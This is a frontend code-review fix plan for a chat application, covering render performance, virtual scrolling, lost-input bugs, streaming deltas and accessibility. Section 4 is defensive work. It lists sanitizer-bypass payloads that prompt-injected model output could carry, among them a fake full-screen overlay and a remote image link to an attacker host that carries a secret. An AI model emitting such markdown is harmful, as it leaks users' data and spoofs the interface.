# Frontend Review: Fix Plan

A full review of `src/frontend/`, done on 2026-09-28 against commit `4c0c19d`. It turned up some bugs, some jank, and a few ways to quietly lose what you typed. Each numbered section is sized for one working session; sections 1–6 are in priority order, and 7–8 are the backlog (they may take more than one session each).

Line numbers are from `4c0c19d` and will drift as earlier sections land, so search for the quoted symbol rather than trusting the number.

**Legend:** **[V]** = a scratch test or benchmark confirmed it during the review; everything else comes from reading the code. The scratch harnesses lived in a session scratchpad and are gone. Section 1 describes how to rebuild one, and the "Tests to add" items turn the important ones into real unit tests.

**Every session:** read `development.md` first. Finish with `npm run format:silent && npm run verify` and `npm run test:silent`. Tick the boxes here, and update `development.md` if the architecture notes change (e.g. the virtual scrolling or streaming sections).

---

## 1. Chat render cost

**Goal:** typing in the chat input and streaming updates must not re-render or re-parse the markdown of messages that didn't change.

**The problem [V].** With 20 assistant messages on screen, 10 keystrokes caused 200 `renderMarkdownSafe` calls, and 10 streaming updates (the frontend flushes every 200 ms) caused another 200. Automatic language detection alone costs 27.8 ms for one unlabeled 30-line code block (measured in Node, the same V8 as Chrome). A page of such messages is therefore about 0.5 s of blocked main thread per keystroke, and the same again every 200 ms while a reply streams. Four causes combine:

- [x] `components/chat/TextGroupView.tsx:90`: `TextSegment` calls `renderMarkdownSafe` (marked → hljs → KaTeX → DOMPurify) on every render, with no caching.
- [x] `lib/markdownRenderer.ts:27`: fences without a language go through `hljs.highlightAuto`, which tries all 192 registered languages. Measured: 30 lines take 27.8 ms (vs 0.7 ms with a language); a 2000-line unlabeled log takes 13.1 s (vs 76 ms as `text`).
- [x] `components/chat/MessageList.tsx:14` and `components/chat/MessageBubble.tsx:10` are not memoized.
- [x] `components/chat/ChatView.tsx` gives them new props on every render:
  - the input text lives in ChatView state (`inputMessage`, line 28), so every keystroke re-renders the whole view;
  - `handleMessageAction` (line 201) is recreated each render;
  - `onPendingToolReject` / `onPendingToolAccept` are inline arrows (lines 573-588);
  - the `MinionChatOverlayContext` value is an inline object (line 377), which re-renders every consumer even through `memo`.

**Fix direction:**

- Cache the rendered HTML per `(text, disableMath)`: `useMemo` in `TextSegment`, and/or a small module-level LRU (helps remounts after virtualization too).
- Skip auto-detection above ~1 KB (escape only), or pass a short `languageSubset`. Consider `highlight.js/lib/core` with a curated language list to shrink the bundle.
- `React.memo` on `MessageBubble` (and the bubble subcomponents if profiling says so). Make `onAction` stable: `useCallback` that reads `messages` and the useChat commands through refs.
- Move the input state into `ChatInput` (the parent reads the text through a ref or callback at send time), or at least make sure nothing below `MessageList` depends on it.
- Memoize the overlay context value.

**Smaller chat-path costs to fold in:**

- [x] `components/chat/ChatInput.tsx:128`: builds a `data:` URL string for every staged image on every keystroke (MBs of string concatenation with large images). Use object URLs (revoked on remove/unmount) or memoize per attachment.
- [x] `components/chat/BackstageView.tsx:98-100` and `components/chat/ToolResultBubble.tsx:61`: the collapsed header preview renders the _entire_ last tool result (or `JSON.stringify(input)`) into a `nowrap` span. A 200 KB file read becomes a 200 KB single-line text node. Slice to the last ~200 characters.
- [x] `components/chat/MessageBubble.tsx:30-44`: re-fetches and re-decrypts a message's attachments every time it scrolls back into view (the effect keys on `isVisible`). Cache per message id, or skip if already loaded.
- [x] `hooks/useChat.ts:836-839`: calls `onMessagesLoaded` inside a `setMessages` updater. That is a side effect in a render-phase function, and it fires twice under StrictMode. Read `messagesRef.current` instead.
- [x] `lib/messageFormatters.ts:44-46`: `formatTimestamp` builds a new `Intl.DateTimeFormat` per call (~38 µs vs ~1 µs cached), once for every message's info bar. Cache the two formatters (same-year / other-year).

**Rebuilding the render-count harness** (useful for the tests below). Render `MessageList` inside a wrapper that holds a text state and passes a fresh `onAction` each render, the same way ChatView does. Then:

- `vi.mock` `lib/markdownRenderer` to wrap `renderMarkdownSafe` with a call counter;
- stub `IntersectionObserver` (deliver `isIntersecting: true` via `setTimeout(0)`), `ResizeObserver`, `window.matchMedia` and `HTMLElement.prototype.getBoundingClientRect` (non-zero height);
- mock `../../client` so `gremlinClient.getAttachments` / `getAPIDefinition` / `getModelsCache` resolve;
- use `vi.useFakeTimers({ toFake: ['setTimeout', 'setInterval', 'clearTimeout', 'clearInterval'] })`, because the default fakes `performance.now` too.

**Tests to add:**

- a `MessageList` render-count test: after mount and the visibility flush, N parent re-renders with unchanged `messages` cause 0 `renderMarkdownSafe` calls;
- a `markdownRenderer` test: a large unlabeled fence does not go through auto-detection.

**Done when:** keystrokes and streaming ticks cause zero markdown renders for unchanged messages, and a streaming tick re-renders only `StreamingMessage`.

---

## 2. Virtual scrolling

**Goal:** no blank flashes, and opening a long chat only renders what's near the viewport.

- [x] **New messages flicker [V].** `components/chat/MessageBubble.tsx:94` (`!isVisible && cachedHeight` → placeholder) combined with `hooks/useVirtualScroll.ts:35` (visibility only updates on the 200 ms interval flush).
  - A new message renders fully and gets measured in its ref callback, but it isn't in `visibleMessageIds` yet.
  - Any re-render before the next flush (a streaming tick, a keystroke) swaps it for a blank placeholder, then mounts it again after the flush.
  - Measured in the harness: 2 text views, then 1, then 2. Remounting also re-parses markdown and loses local UI state.
- [x] **Opening a long chat [V].** With 200 messages, all 200 parse their markdown on first paint, because nothing has a cached height yet.
  - Any re-render before the first flush then turns _all 200_ into placeholders, including the ones in view, so the chat is blank until the flush.
  - During the snapshot replay each `message_created` arrives as its own worker/WebSocket message and `setMessages` call, so this repeats as the list grows.
- [x] `src/index.css:12-15`: `.ios-scroll` sets `scroll-behavior: smooth`. `MessageList` uses that class, so every programmatic "stick to bottom" (`scrollTop = scrollHeight`) animates during streaming and races with new content. Use instant scrolling for auto-follow, e.g. drop `smooth` from that class or use `scrollTo({ behavior: 'instant' })`. Keep smooth only for the scroll-to-bottom button.
- [x] `hooks/useVirtualScroll.ts:59`: the observers' `rootMargin` is computed once from the container height at mount, so it goes stale after resize, rotation or the mobile keyboard opening. Recreate it on container resize (ResizeObserver).
- [x] `hooks/useVirtualScroll.ts:77-87`: `applyPendingUpdates` always builds a new `Set`, even when every pending entry matches the current state, which forces a `MessageList` re-render. Return `prev` when nothing changed. `heightsRef` also never prunes deleted messages.
- [x] `components/chat/MessageBubble.tsx:120`: in focus mode, hidden tool-result messages still render an empty `mb-4 px-4` div, leaving 16 px gaps that pile up in tool-heavy chats. Render a zero-height element that is still registered.

**Fix direction:**

- Make visibility tri-state: _unknown_ (never classified) renders fully, and only an explicit _hidden_ from the outer observer renders a placeholder. Alternatively, mark a message visible synchronously in `registerMessage` when its element is already in the inner zone.
- On chat open, mount only the tail (e.g. the last ~20 messages) and grow upward as the user scrolls; this also removes the O(N) first paint.
- Consider batching the snapshot replay on the frontend (collect the `message_created` events until `snapshot_complete`, then do one `setMessages`). This is the natural companion to the tail-only mount.

**Tests to add:** a `useVirtualScroll` / `MessageList` test where an appended message plus an unrelated re-render before the flush never produces a placeholder; and an open-chat test where the number of markdown renders at mount is about the tail size, not N.

**Done when:** those two tests pass, and a real device shows no blank flash when opening a long chat or receiving messages.

**Follow-up (landed):** with only the tail mounted, the native scrollbar covered just the mounted slice, so reaching message 1 of a 1300-message chat took ~64 upward batches. The mount window is now a range that can jump anywhere, and `ChatScrubber` (index-based rail, ticks for the user's own messages, "↓ Latest" pill replacing the black button, touch rules for phones) drives it. See Virtual Scrolling in `development.md`.

---

## 3. Paths that lose user input or data

**Goal:** nothing the user typed or stored disappears because of an error, a race, or a misclick.

**Chat and project composers:**

- [x] (Landed: `sendMessage` / `resolvePendingToolCalls` return whether the input was handed off and `sendEditedMessage` returns `'sent' | 'untouched' | 'truncated'`; ChatView restores the text and attachments, `startLoop` rejections alert via `describeLoopStartError`, a thrown loop's `loop_ended` alerts once (the duplicate synthetic `loop_ended` is gone), and Reject with a follow-up now sends it with its attachments. Tests in `useChat.test.ts`, `ChatView.renderCost.test.tsx`, `GremlinServer.test.ts`, `GremlinSession.test.ts`.) **A failed send loses the message.** `components/chat/ChatView.tsx:324-332` clears the input, the attachments and the draft _before_ `sendMessage`. If `startLoop` rejects (CHAT_BUSY, a request dropped with the socket), `hooks/useChat.ts:1005-1008` only calls `console.error`, and the session error handler (`useChat.ts:848-851`) only logs too. The text is gone and nothing tells the user. The pending-tool Reject/Accept handlers (`ChatView.tsx:573-588`) clear the input the same way. Fix: clear only after `startLoop` resolves (or restore on failure), and show an alert.
- [x] (Landed: Apply is disabled until a model is picked; ProjectView keeps the text, alerts and stays on a failed start, and a retry reuses the created chat. Tests in `ModelSelector.test.tsx`, `ProjectView.test.tsx`.) **The model selector can apply "no model" [V].** `components/project/ModelSelector.tsx:84` clears the model when the provider changes, but Apply (line 93) stays enabled and calls `onSelect(apiDefId, null)`.
  - In ProjectView the new chat pairs the new provider with the project's model id, so `buildLoopOptions` throws "model not found" before the user message is saved.
  - `components/project/ProjectView.tsx:305-315` then logs the error and navigates to an empty chat after clearing the text (the same happens at lines 338-347).
  - In ProjectSettingsView every section vanishes, because the sections are hidden while no model is selected.
  - Fix: disable Apply while no model is selected. On `startLoop` failure, keep the text and alert.
- [x] (Landed: `key={projectId}` on both routes; `useDraftPersistence` restores on every key change, keeps the inherited value out of the new key, and flushes pending writes on unmount, key change and `pagehide`. Tests in `App.test.tsx`, `useDraftPersistence.test.ts`.) **Project switches leak state [V].**
  - `App.tsx:233-243`: `ProjectViewRoute` and `ProjectSettingsViewRoute` aren't keyed by `projectId` (`ChatViewRoute` is). Going from project A to B keeps A's new-chat text, attachments and validation error. After 500 ms A's text overwrites B's saved draft. Until B loads, `useProject.project` is still A, so a send creates the chat in A.
  - `hooks/useDraftPersistence.ts:93-126`: the restore effect runs before the context-change effect resets `initializedRef`, so a new `contextId` is never restored (this affects anything that changes `contextId` without remounting).
  - `hooks/useDraftPersistence.ts:153-157`: unmount clears the debounce timer instead of flushing it, so the last ≤500 ms of typing is lost on navigation.
  - Fix: `key={projectId}` on both routes; do reset + restore in one effect keyed on the storage key; flush on unmount and on `pagehide`.
- [x] (Landed: `hooks/useImeSafeEnter.ts`, a React-prop `onCompositionEnd`, used by ChatInput, ProjectView, the Sidebar's new-project name and ChatView's rename. Tests in `useImeSafeEnter.test.tsx`, `ProjectView.test.tsx`.) **The IME guard in ProjectView never works [V].** `components/project/ProjectView.tsx:107-120` attaches the `compositionend` listener in an effect with `[]` deps. That effect runs while `project` is null and the textarea isn't mounted, and never runs again. Pressing Enter to confirm a CJK candidate sends the message. Fix: use `onCompositionEnd` or a ref callback, as `ChatInput` does.

**Dialogs and error handling:**

- [x] (Landed: one `queue` state whose head is the visible dialog. Tests in `AlertProvider.test.tsx` → `AlertProvider queue`.) **Dialogs get lost [V].** `contexts/AlertProvider.tsx:24-26, 29-87`: `dialogStateRef` is only synced in an effect after commit. With browser-like scheduling:
  - `await showAlert(A); await showAlert(B)` queues B, which is never shown and never resolves;
  - two calls in the same tick overwrite each other, and the first promise never resolves.
    Awaiting callers hang, for example with a spinner stuck on. Fix: update the ref synchronously in `show*` / `resolve`, or use one `useReducer` queue whose head is the visible dialog. Don't call `setDialogState` inside a `setQueue` updater.
- [x] (Landed: `components/ErrorBoundary.tsx`; a full-page one in `ErrorProvider` and one per route that keeps the sidebar and resets on navigation. Tests in `ErrorBoundary.test.tsx`, `ErrorProvider.test.tsx`, `App.test.tsx`.) **The error boundary does nothing [V].** `contexts/ErrorProvider.tsx:22-25`: `getDerivedStateFromError` returns `{ hasError: false }`. The child throws again, the error escapes the root, and the user gets a white screen with no floating error button. Fix: set `hasError: true`, render a fallback with the error plus Retry/Reload, and add one boundary per route so the sidebar survives.

**Saving projects and chat settings:**

- [x] (Landed: `updateProject` adopts the merged project `patchProject` returns. Test: two quick updates both stick, `useProject.test.ts`.) (Partly landed with §7: ProjectSettingsView saves a patch of only its form fields, and ProjectView patches only `systemPrompt` or `{ name, icon }`. `updateProject` still merges into the committed `project` instead of adopting what `patchProject` returns.) **Project updates build on a stale copy [V].** `hooks/useProject.ts:171-197`: `updateProject` rebuilds local state from the `project` captured at render time, so two quick updates lose the first. The callers (`ProjectView.tsx:358`, `ProjectView.tsx:470`, `ProjectSettingsView.tsx:322`) also pass the whole `{ ...project }`, which turns the surgical `patchProject` into a full overwrite with stale fields. Fix: pass only the changed fields, and adopt the merged project that `patchProject` returns.
- [x] (Landed: `updateProject` returns `Promise<boolean>` and alerts; ProjectSettingsView, ProjectView's modals and `SystemPromptModal` act only on `true`. A failed list refresh after a landed write no longer fails the write. Tests in `ProjectSettingsView.test.tsx`, `ProjectView.test.tsx`, `SystemPromptModal.test.tsx`, `AppContext.test.tsx`.) **A failed save still navigates away [V].** `useProject.ts:193` swallows the error, so `ProjectSettingsView.tsx:322-324` clears the system-prompt draft and navigates away, discarding every edit. ProjectView's rename and system-prompt saves follow the same pattern. Fix: rethrow (or return a result) and stay on the page.
- [x] (Landed: `ApiDefinitionForm` saves and `SettingsPage.handleDelete` catch and alert. Tests in `SettingsPage.test.tsx`.) (Partly landed with §7: `deleteProject` returns the backend promise, and ProjectSettingsView navigates only after it resolves and alerts on failure. The API definition form's save, which replaced `SettingsPage.handleSave`, still has no `catch`.) **Project delete isn't awaited.** `useProject.ts:199-201` doesn't await `app.deleteProject`, so `ProjectSettingsView.tsx:386-387` navigates before the cascade delete finishes, and failures become unhandled rejections. `SettingsPage`'s `handleSave` has no `catch` either.
- [x] (Landed: dirty compares `fromDraft` of the draft and of a saved baseline; the draft re-seeds after a save, `fromDraft` no longer emits an undefined effort/verbosity, and a failed save rolls back and stays dirty. Tests in `ChatSettingsPanel.test.tsx`, `chatSettingsDraft.test.ts`.) **ChatSettingsPanel still looks dirty after saving [V].** `components/chat/ChatSettingsPanel.tsx:45, 57, 96`: `draft` is never re-seeded after a save, and `toDraft(fromDraft(d))` doesn't round-trip. Cases that stayed dirty: temperature `"1.0"`; a persona typed and then switched back to "project"; a custom pre-persona with an empty path; an effort override left at the default. Save stays enabled and Close asks "Discard changes?". Fix: `setDraft(toDraft(savedConfig))` after the save.

**File manager (VFS):**

- [x] (Landed: the key is `vfs_<projectId>_<encoded path>`. Test in `VfsFileEditor.test.tsx`.) **VFS drafts cross projects.** `components/project/VfsFileEditor.tsx:32`: the draft key is `vfs_${path}` with no project id. An unsaved draft for `/memories/notes.md` in project A restores into B's editor as "Unsaved changes", and Save writes A's text into B. Add the project id (or the adapter namespace) to the key.
- [x] (Landed with §7: a selection counter drops a stale edit load, with regression tests in `VfsManagerView.test.tsx` and `VfsFileModal.test.tsx`.) **Opening the editor races file selection.** `components/project/VfsManagerView.tsx:107-117`: `handleDesktopEdit` awaits `readFile(selectedPath)` and then sets the content and `mode='edit'` unconditionally. Clicking file B during the read opens B's editor with A's content, and Save overwrites B. Compare against the current selection (via a ref) after the await.

**First-run setup (OOBE):**

- [x] (Landed, test in `OOBEScreen.test.tsx`.) `components/OOBEScreen.tsx`: switching the storage type back to IndexedDB hides the "Use Existing Data" radio but leaves `initMode === 'existing'`. The CEK panel stays, no radio is selected, and Get Started runs the existing-data path against local storage. Reset `initMode` when the storage type changes.
- [x] (Landed: `isStorageEmpty()` after `init`, then two destructive confirms; Cancel leaves nothing configured. Tests in `OOBEScreen.test.tsx`.) `components/OOBEScreen.tsx:332-340`: "Import from Backup" runs in `'replace'` mode with no `isStorageEmpty` check and no confirmation, so on a server that already holds data under the same key, it silently replaces that data. `ImportDataModal` double-confirms the same operation; do the same here.

**Missing confirmations and false "Copied":**

- [ ] (Partly landed: bulk attachment delete and VFS "Drop old versions" confirm, tests in `AttachmentManagerView.test.tsx` and `VfsFileViewer.test.tsx`. TODO: the sidebar STOP guard, tracked in `development.md` → Pending Features.) Destructive actions without confirmation:
  - bulk attachment delete (`components/AttachmentManagerView.tsx:57`);
  - VFS "Drop old versions" (`components/project/VfsFileViewer.tsx:111`);
  - the one-tap hard-abort STOP in `components/activeLoops/ActiveLoopRow.tsx:56`, which leaves the chat locked behind an incomplete tail.
    Use `showDestructiveConfirm`, or a two-tap arm for STOP.
- [x] (Landed with §6: `copyText`; on failure the key is selected for a manual copy.) `components/DataManagerPage.tsx:149-150`: `navigator.clipboard.writeText(displayCEK)` isn't awaited, so "Encryption key copied" shows even when the copy fails. In insecure contexts (plain-http LAN server mode) `navigator.clipboard` is undefined and this throws. Someone who believes they copied their CEK when they didn't can lose their data. `components/OOBEComplete.tsx:25` has the same issue, failing silently. Await it, handle a missing `navigator.clipboard`, and fall back to select-all.

**Tests to add:** one regression test per [V] item. Most already have obvious shapes: send failure keeps the text; Apply disabled with no model; the draft restores on a context change; two queued alerts both resolve; a throwing child renders the fallback; two quick `updateProject` calls both stick; ChatSettingsPanel is not dirty after save.

**Done when:** every box above is ticked with a test, or a note explaining why a test isn't practical.

---

## 4. Markdown sanitization and links

**Goal:** model output (including prompt-injected tool or web content) can't restyle the app, collect input, leak data through requests, or navigate the app away.

- [x] (Landed: trusted slots plus an allowlist sanitizer; KaTeX, code blocks and checkboxes skip DOMPurify via per-render placeholders, model HTML keeps only `citation-link` as a class, and remote images render as `🖼 alt (host)` links. Tests in `markdownRenderer.test.ts` → `sanitizer` / `image policy`.) **Unsafe HTML survives sanitizing [V].** `lib/markdownRenderer.ts:275-280`: DOMPurify runs with default settings plus `data-code` / `thinking`. These survive:
  - `style="position:fixed;inset:0;z-index:99999"`, a full-screen overlay that can fake UI;
  - `<form action=…><input>`;
  - remote `![](https://attacker/?d=SECRET)` images, which load automatically (the classic exfiltration channel).
    `javascript:` URLs and `on*` handlers are already stripped.
    Fix: `FORBID_ATTR: ['style']` and `FORBID_TAGS: ['form', 'input', 'textarea', 'select']`. Leave out `button`: the code-copy button is a `<button>` built by the renderer _before_ sanitizing (`markdownRenderer.ts:36-41`). Either keep `button` allowed and strip it down to `class` / `type` / `aria-label` / `data-code` in a hook, or inject the copy button after sanitizing. Add an `afterSanitizeAttributes` hook that forces `target="_blank" rel="noopener noreferrer"` on anchors. Decide on a remote-image policy: block, click-to-load, or allow only `data:` / same-origin.
- [x] (Landed: an `afterSanitizeAttributes` hook adds `target="_blank" rel="noopener noreferrer"` to every `a[href]`, citation links included; the sign-in panel links go through `lib/safeHref.ts`.) **Links navigate the app tab away.** Markdown links render without a `target`, and nothing intercepts clicks, so a click replaces the app. The hook above fixes this; citation links (`a.citation-link`) need the same treatment.
- [x] (Landed: the `<thinking>` tokens are lexed and parsed by the active instance; minion overlays and minion activity in tool results now get the option too.) **"Disable Math" is ignored inside thinking blocks.** `lib/markdownRenderer.ts:88`: the `<thinking>` extension's renderer calls the global math-enabled `marked.parse`. Route it through the active instance.
- [x] (Landed: `[0-9]+`, tested against the trimmed content; the dead exports are gone; KaTeX gets `maxSize` / `maxExpand` since its output is trusted.) `lib/mathRenderer.ts:97`: in `MATH_FULL_MATCHES = /^([a-zA-Z]|(0-9)+)$/`, the `(0-9)+` part matches the literal text "0-9", not digits, so the intended all-digits branch is dead, and the regex runs on untrimmed content. `extractMath` (line 213), `restoreMath` (line 312) and `processWithMath` look unused since math moved into the marked extensions; confirm and delete them.

**Tests to add:** sanitizer tests for each payload above (style, form, remote img, anchor target/rel); a test that Disable Math applies inside `<thinking>`; `mathRenderer` single-digit/all-digit cases.

**Done when:** the sanitizer tests pass, and the existing markdown/math tests still pass, code-copy button included.

---

## 5. Streaming delta encoding

**Goal:** a streaming update carries only what's new, not the whole reply so far.

- [x] `src/shared/services/agentic/agenticLoopGenerator.ts:1868` yields `{ type: 'streaming_chunk', groups: assembler.getGroups() }` for every provider chunk, i.e. the full accumulated groups (thinking + text + tool previews) every time.
  - `src/shared/engine/ChatRunner.ts:364-365` forwards it, and `LoopRegistry.ts:416` caches it as full state.
  - Every chunk crosses the worker `postMessage` (structured clone) or the WebSocket (`JSON.stringify` + parse on the main thread).
  - Rough estimate (not measured): a 40 KB reply in ~5k chunks ships ~100 MB, i.e. O(n²) in reply length. In server mode over mobile data this matters most.
- The minion path already solved this with `tool_groups_delta` (`src/shared/services/tools/toolGroupsDelta.ts`: `applyGroupsDelta` / `assembleGroups`, consumed in `useChat.ts` at the `tool_groups_delta` case). Reuse that shape.

**Fix direction:**

- Emit append-only deltas for the assistant stream (new blocks, plus text/thinking appended to the last block). Keep `streaming_snapshot` (full state) for attach/reconnect resync; the delta base resets on every snapshot.
- `LoopRegistry` keeps caching full state (apply the deltas server-side) so `attachChat` can still replay a `streaming_snapshot`.
- The frontend (`useChat.ts:591-605`) applies deltas into a ref and keeps the 200 ms React flush.
- `minionTool.ts:2303` consumes the child loop's `streaming_chunk`. Adapt it, and check the nested-minion forwarding.
- Parity: the worker (`src/worker/workerHandler.ts`) and the server (`src/server/websocketTransport.ts`) only forward envelopes, so the change should live in `src/shared/` and the frontend. Check both anyway, per CLAUDE.md.
- `StreamingContentAssembler` mutates blocks in place ("object stability"). With `InProcessTransport` (tests) no clone happens, so the deltas must not alias mutable assembler state.

**Tests to add:** a delta round-trip test (assemble the deltas on the receiver and compare with `assembler.getGroups()` at each step); a reconnect mid-stream test (snapshot then deltas); a minion streaming test that still passes.

**Done when:** the bytes per chunk are proportional to the chunk size, not to the reply length, in both worker and server mode.

**Landed.** Bytes per chunk now follow the chunk: 10k chunks cost about 2× what 5k do (`StreamingContentAssembler.takeOps.test.ts`), and a chunk that changes nothing visible sends nothing. How it was closed, and where the fix differs from the direction above:

- **Ops, not append-only deltas:** `StreamingContentAssembler` journals its own mutations and `takeOps()` turns them into `reset` / `add` / `append` / `put` ops; `streaming_delta { ops }` replaces `streaming_chunk`, and `streaming_snapshot` stays for attach/reconnect. Append-to-the-last-block wasn't enough: Google grounding and claude-agent `notify` keep growing a block that is no longer last, and web search / fetch / annotation blocks change in place (`put`).
- **No aliasing:** `takeOps()` clones `add` / `put` payloads and `applyStreamingGroupsOps` is copy-on-write, so nothing on the wire, in the `LoopRegistry` cache or behind `InProcessTransport` shares live assembler objects. That also fixed the registry cache, which used to hand out live objects.
- **Minion:** moved to the same ops (`ToolGroupsDelta.streaming_ops`) instead of diffing snapshots, which resent everything on every chunk once a web search preceded the text. The dead `groups_update` → `tool_block_update` path is gone. Nested minions still don't stream live (the known Phase 2 limitation).
- **Reconnect:** no new wire field, and no registry delta counter either (the planned `deltaSeq`): a counter can't order non-delta events against the cache read, and queue position can. `attachChat` takes everything queued so far in the same synchronous step as its cache read. The registry folds every event into its caches before the fan-out, so the taken deltas are already in the snapshot and are dropped. That also fixed minion appends being applied twice on attach, a bug that predates this section. The other taken events are replayed after `snapshot_complete` and before the `streaming_snapshot`, so an earlier iteration's assistant `message_created` can't blank a snapshot that already holds the next iteration. `GremlinSession` now drops a stale `loop_ended` that attachChat replays after naming a newer loop.
- **Frontend:** `useChat` applies every delta into `streamingStateRef` and keeps the 200 ms flush, as planned. An assistant `message_created` clears the ref and the displayed state; the replay order above keeps that from wiping a newer iteration.
- **Known cost:** a server-mode tab left open across a server upgrade shows no live text until it reloads (Known Issues in `development.md`).

---

## 6. Chat UX, modal accessibility and layout fixes

**Goal:** the chat feels good to use, and the shared modal/layout primitives behave on keyboards and phones.

**Composer** (`components/chat/ChatInput.tsx`, `ChatView.tsx`):

- [x] The textarea is `disabled` for the entire loop (`ChatInput.tsx:194`, passed from `ChatView.tsx:663`). You can't draft the next message while a reply streams, and focus isn't restored afterwards: on desktop you click back in after every reply, and on mobile the keyboard closes. Keep the textarea enabled, disable only Send, and restore focus when the loop ends (desktop).
- [x] No paste or drag-and-drop for images; the 📎 picker is the only way. Add `onPaste` (clipboard images) and drop handling that reuse `onFilesAdded`.
- [x] Enter doesn't send attachment-only messages or resolve pending tools (`ChatInput.tsx:59` checks `value.trim()`), but the Send button does. Share one "can send" predicate.
- [x] The input caps at 120 px (`ChatInput.tsx:197`). Allow more on desktop (e.g. 40vh).
- [x] Edit is destructive (`ChatView.tsx:229-258`): it deletes the message and everything after it, then drops the text into the composer. If the user navigates away, only the draft remains. Consider an in-place edit that deletes only on resend.

**Streaming → final:**

- [x] `components/chat/StreamingMessage.tsx:104-106`: on desktop the streaming text is in a gray rounded bubble, but the finished assistant message has no bubble, and raw text jumps to formatted markdown in one step. Use one container style for both. Once section 1 lands, render markdown while streaming (throttled, last block only).
- [x] Thinking or tool blocks expanded during streaming collapse when the message finalizes, because the finished message uses a different component tree. Carry the expanded state over (e.g. keyed by block index in a small per-message store).

**Message actions and feedback:**

- [x] Copy, Edit, Fork and Rollback are hidden behind a click on the 10 px info row (`components/chat/MessageInfoBar.tsx`), with small tap targets. Consider surfacing Copy (and Edit for user messages) on hover or long-press, and raise the row to ≥12 px.
- [x] Copying opens a _modal_ "Copied" (`AssistantMessageBubble.tsx:30`, `UserMessageBubble.tsx:54`, `useChat.ts:1113`). Use a toast or an inline ✓, like the code-copy button. `ToolResultView.tsx:387-398` "Copy JSON" gives no feedback at all.
- [x] The code-block copy button is `opacity: 0` until hover (`src/index.css`, `.code-copy-button`), with no `@media (hover: none)` fallback, so it's invisible on phones.
- [x] The ⋯ view toggles (Focus Mode, Expand Minions, Disable Math, Always Auto Scroll, `ChatView.tsx:53-56`) reset on every chat switch. Persist them (per chat or globally). The menu (lines 66-75) doesn't close on Escape.

**Remaining chat bugs:**

- [x] **Cache warning** (`components/chat/CacheWarning.tsx:19-71`):
  - The "older than 5 minutes" check only runs when `messages` changes, so the warning never appears while you sit on a chat and the cache actually expires. Add a timer set to the expiry.
  - Each run makes 2 RPCs (`getAPIDefinition`, `getModelsCache`), which is hundreds during a snapshot replay. Skip while `snapshotLoading`, and cache the API type.
  - There is no cancellation, so a stale run can win.
  - It flickers, because it resets to false first.
- [x] **Minion chat view:**
  - `hooks/useMinionChat.ts:23-47` loads once, so opening a running minion ("View Chat") shows a frozen transcript. Subscribe to live updates, or at least refresh on `loop_ended`.
  - `components/chat/MinionChatView.tsx:99-113` only handles `rollback`, so the Edit and Fork buttons on user messages there do nothing. Hide them, or implement them.
  - The header shows the raw minion chat id (lines 136-137); show the persona or display name instead.
- [x] Dead code: ChatView never passes `onDeleteMessage`, and no bubble emits `'delete'`, so the `delete` branch of `handleMessageAction` (`ChatView.tsx:259-270`) is unreachable. Delete it, or wire it up deliberately.
- [x] `text-shadow-[0 0]` in `BackstageView.tsx:171,178` and `ToolResultBubble.tsx:108,116` is an invalid Tailwind arbitrary value (spaces need `_`), so it generates no CSS. The docstring on `ToolResultView` (line 52, "Auto-expands when status is 'running'") is stale; it's modal-based now.

**Modal accessibility** (the shared primitives):

- [x] `components/ui/Modal.tsx` and the `AlertProvider` dialogs lack Escape handling, `role="dialog"` / `aria-modal`, a focus trap, and focus restore on close. `ErrorView.tsx` reimplements its own modal; move it to `Modal`.
  - A destructive confirm autofocuses the red button (`AlertProvider.tsx:169`), so Enter/Space deletes. Focus Cancel instead.
  - Escape needs to be stack-aware: `ChatSettingsPanel.tsx:84-90` listens on `document`, so Escape inside a nested picker closes the whole panel, or stacks "Discard changes?" dialogs [V]. It also ignores `isComposing`.
- [x] The closed mobile drawer is only translated off-screen, so it is still tabbable. Add `inert` while closed.

**Layout:**

- [x] **Safe-area classes override padding [V].** In `src/index.css:18-34`, `.safe-area-inset-*` and `.scroll-safe-bottom` are unlayered, so they beat Tailwind's `p-*` utilities (which live in `@layer utilities`). On notch-less devices bottom padding becomes 0 in `Modal.tsx`, the Sidebar footer, `ChatSettingsPanel`, `CloneMinionChatModal`, `VfsPathPickerModal` and `OOBEScreen`. Move them into `@layer utilities`, or use `pb-[max(1rem,env(safe-area-inset-bottom))]`.
- [x] `components/ErrorFloatingButton.tsx:17`: fixed at `bottom-4 left-4`, so it covers the composer's 📎 button once any error is captured. Move it to the header, or offset it above the input.
- [x] `components/ConnectionStatusBanner.tsx:142-186`:
  - it renders above the page's safe-area spacer, so in an iOS PWA it sits under the notch;
  - `auth_failed` says to reload but has no Reload button;
  - it has no `role="status"` / `aria-live`.

**Done when:** the boxes are ticked, and a quick pass on a phone and on desktop with only the keyboard feels right.

**Landed.** How the less obvious boxes were closed, and where the fix differs from the direction above:

- **Escape and focus:** one overlay stack (`hooks/useOverlay.ts`) serves every layer: Modal, the alert dialogs, the lightbox, chat settings, the ⋯ menu, minion overlays, the mobile drawer. A layer takes focus on its container, not its first control, because focusing a text field from a tap would pop the iOS keyboard.
- **Edit:** it fills the composer and deletes nothing until the edit is sent (`useChat.sendEditedMessage`). A banner with Cancel replaces the confirm dialog. Sending an edit also goes through on a chat locked by an incomplete tail, since the truncation removes that tail.
- **Streaming → final:** both trees render through `AssistantGroups`. Streaming markdown doesn't store to the LRU (`cache: false`). The per-block memo already makes it "last block only". Expanded state carries over at group level only.
- **Minion chat view:** there is no event stream for minion chats, so it refetches every 2 s while the parent loop runs, plus once when the loop ends.
- **Dead code:** the `copy` branch and `useChat.copyMessage` were unreachable too, and are gone along with `delete`.
- **`text-shadow`:** it is now a valid `text-shadow-[0_0_2px_white]`. Check it on screen, and delete it if the stacked icons look worse.
- **Error button:** on phones it moved up above the composer instead of into the header.
- **Code copy:** `lib/clipboard.ts` (`copyText`) now backs every copy. It also closed §3's CEK "Copied" box.
- **Safe area:** `scroll-safe-bottom` stays, because `AttachmentManagerView` uses it correctly.

---

## 7. Backlog: other bugs and performance

These are grouped by area; pick an area per session.

**App shell and global state**

- [x] **App-wide re-renders.**
  - `App.tsx:41` has `AppContent` read the entire AppContext just for `isInitializing`, and the routes get inline `onMenuPress` closures (lines 129-154). Any context change re-renders the active page, including ChatView. Triggers: `refreshProjects` after every `patchProject`, `refreshModels`, and the WelcomeScreen quota refresh (a new object each time).
  - Opening or closing the drawer, or collapsing the sidebar, also re-renders ChatView.
  - Split the context (stable callbacks + init flag vs data), and hoist the callbacks.
  - `isLoadingProjects` / `isLoadingModels` (`contexts/AppContext.tsx:30-31`) are never read outside the context. Delete them.
